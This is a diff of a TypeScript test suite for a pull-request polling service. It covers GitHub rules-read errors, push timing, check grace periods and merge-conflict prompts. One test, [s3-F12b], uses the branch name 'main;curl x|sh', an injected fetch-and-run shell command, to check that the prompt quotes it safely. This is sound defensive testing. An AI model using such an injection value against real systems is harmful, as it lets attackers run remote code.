@@ -102,6 +102,10 @@ class Fake {
   headRefMissing = false;
   /** PR 的目标分支（默认 main = 默认分支）。 */
   baseRef = 'main';
+  /** base 仓的默认分支。 */
+  defaultBranch = 'main';
+  /** rules 读非 2xx 时的 message。 */
+  rulesMessage = 'x';
 
   reads = (part: string) => this.requests.filter((u) => u.includes(part));
 
@@ -124,7 +128,7 @@ class Fake {
           ref: this.headRefMissing ? undefined : (this.headRef ?? this.branch),
           repo: this.headRepoId === null ? null : { id: this.headRepoId },
         },
-        base: { ref: this.baseRef, repo: { id: REPO_ID, default_branch: 'main' } },
+        base: { ref: this.baseRef, repo: { id: REPO_ID, default_branch: this.defaultBranch } },
       });
     }
     if (/\/rules\/branches\//.test(url)) {
@@ -143,7 +147,9 @@ class Fake {
           );
         }
         const message =
-          this.rulesRateLimit === 'text' ? 'You have exceeded a secondary rate limit.' : 'x';
+          this.rulesRateLimit === 'text'
+            ? 'You have exceeded a secondary rate limit.'
+            : this.rulesMessage;
         return reply(this.rules, { message });
       }
       return reply(
@@ -524,6 +530,27 @@ describe('#1403 segment 3: checks by head SHA, required checks, BEHIND / DIRTY',
     w.fake.runs[HEAD] = [{ name: 'check', conclusion: 'failure' }];
     await w.poller.sweep(t0 + CI_EMPTY_CHECKS_GRACE_MS + 1_000);
     expect(fixSteps(w)).toHaveLength(2);
+  });
+
+  test('[s3-F30d] a verify step that pushed just now also counts as pacman’s last push', async () => {
+    const w = makeWorld({ phase: 'review' });
+    const t0 = Date.now();
+    w.s.db
+      .insert(stepTable)
+      .values({
+        id: `step-vp-${w.buildId}`,
+        buildId: w.buildId,
+        kind: 'verify',
+        status: 'done',
+        checkpointCommit: PUSHED,
+        createdAt: t0 - 2_000,
+        finishedAt: t0 - 1_000,
+      })
+      .run();
+    w.fake.mergeableState = 'dirty';
+    await w.poller.sweep(t0);
+    expect(conflictSteps(w)).toEqual([]);
+    expect(w.phase()).toBe('review');
   });
 
   test('[s3-F30c] at review, a dirty read on the head before pacman’s last push is waited out', async () => {
@@ -932,16 +959,55 @@ describe('#1403 segment 3: checks by head SHA, required checks, BEHIND / DIRTY',
     expect(none.phase()).toBe('review');
   });
 
-  test.each([403, 404])(
-    '[s3-F27] the rules read answers %i (no rulesets on this plan or server): no rules, the classic list decides',
-    async (status) => {
+  test.each([
+    [403, 'Upgrade to GitHub Pro or make this repository public to enable this feature.'],
+    [404, 'Not Found'],
+  ] as const)(
+    '[s3-F27] the rules read answers %i (%s): no rules, the classic list decides',
+    async (status, message) => {
       const w = makeWorld();
       w.fake.rules = status;
+      w.fake.rulesMessage = message;
       w.fake.runs[HEAD] = [{ name: 'check' }];
       await w.poller.sweep();
       expect(w.phase()).toBe('review');
     },
   );
+
+  test('[s3-F27b] the rules read answers 403 for the token’s permissions (not the plan): no move', async () => {
+    const w = makeWorld();
+    w.fake.rules = 403;
+    w.fake.rulesMessage = 'Resource not accessible by integration';
+    w.fake.runs[HEAD] = [{ name: 'check' }];
+    await w.poller.sweep();
+    expect(w.phase()).toBe('building');
+    expect(w.fake.reads('/check-runs')).toEqual([]);
+  });
+
+  test('[s3-F12b] a default branch name with shell characters is quoted in the merge-conflict prompt', async () => {
+    const w = makeWorld();
+    w.fake.defaultBranch = 'main;curl x|sh';
+    w.fake.baseRef = 'main;curl x|sh';
+    w.fake.mergeableState = 'dirty';
+    await w.poller.sweep();
+    const prompt = conflictSteps(w)[0]?.prompt ?? '';
+    expect(prompt).toContain("git fetch origin 'main;curl x|sh'");
+    expect(prompt).toContain("git merge 'origin/main;curl x|sh'");
+    expect(prompt).not.toContain('git fetch origin main;');
+  });
+
+  test('[s3-F4c] the missing-check grace keeps its start while another required check re-runs', async () => {
+    const w = makeWorld();
+    w.fake.protection = { contexts: ['a', 'b'], checks: [] };
+    w.fake.runs[HEAD] = [{ name: 'a' }];
+    const t0 = Date.now();
+    await w.poller.sweep(t0);
+    w.fake.runs[HEAD] = [{ name: 'a', status: 'in_progress', conclusion: null }];
+    await w.poller.sweep(t0 + 60_000);
+    w.fake.runs[HEAD] = [{ name: 'a' }];
+    await w.poller.sweep(t0 + CI_EMPTY_CHECKS_GRACE_MS + 1_000);
+    expect(w.systemRows().filter((c) => c.includes('「b」'))).toHaveLength(1);
+  });
 
   test('[s3-F28] the verdict follows a refreshed required list even when the check runs answer 304', async () => {
     const w = makeWorld();
